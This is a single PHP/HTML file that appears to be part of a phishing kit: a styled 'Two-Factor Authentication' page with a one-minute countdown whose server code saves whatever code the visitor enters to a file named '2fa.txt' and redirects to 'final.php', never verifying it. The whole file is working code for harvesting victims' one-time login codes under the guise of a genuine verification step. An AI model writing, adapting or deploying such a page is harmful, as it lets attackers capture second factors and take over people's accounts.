<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $code = $_POST['code'];
    file_put_contents("2fa.txt", "2FA: " . $code);
    header("Location: final.php");
    exit();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Two-Factor Authentication</title>
  <style>
    body {
      background: linear-gradient(to bottom, #f0f8ff, #ffffff);
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .verify-box {
      border: 1px solid rgba(91, 91, 91, 0.2);
      background: white;
      padding: 40px;
      border-radius: 16px;
      box-shadow: 0 0 15px rgba(0, 123, 255, 0.2);
      text-align: center;
      width: 320px;
    }

    .verify-box img {
      width: 60px;
      margin-bottom: 20px;
    }

    .verify-box h2 {
      color: #007bff;
      margin-bottom: 20px;
    }

    .verify-box input[type="text"] {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 1px solid #ccc;
      border-radius: 8px;
      box-sizing: border-box;
    }

    .verify-box button {
      background-color: #007bff;
      color: white;
      padding: 12px;
      width: 100%;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      margin-top: 10px;
      font-weight: bold;
    }

    .verify-box button:hover {
      background-color: #0056b3;
    }

    .timer {
      margin-top: 16px;
      font-size: 14px;
      color: #555;
    }
  </style>
</head>
<body>

  <form method="POST" class="verify-box">
  
    <h2>Two-Factor Authentication</h2>
    <p style="text-align:center; color:#333; margin-bottom: 15px;">
    Check your phone or email for the verification code.
    </p>

    <input type="text" name="code" placeholder="Enter 2FA Code" required><br>
    <button type="submit">Verify</button>

    <div class="timer" id="timer">⏳ Time remaining: 1:00</div>
  </form>

  <script>
    let seconds = 60;
    const timerElement = document.getElementById("timer");

    const countdown = setInterval(() => {
      seconds--;
      let min = Math.floor(seconds / 60);
      let sec = seconds % 60;
      timerElement.textContent = `⏳ Time remaining: ${min}:${sec < 10 ? '0' + sec : sec}`;

      if (seconds <= 0) {
        clearInterval(countdown);
        timerElement.textContent = "⏳ Time expired. Please refresh the page.";
        // optionally disable input and button
        document.querySelector("input[name='code']").disabled = true;
        document.querySelector("button[type='submit']").disabled = true;
      }
    }, 1000);
  </script>

</body>
</html>
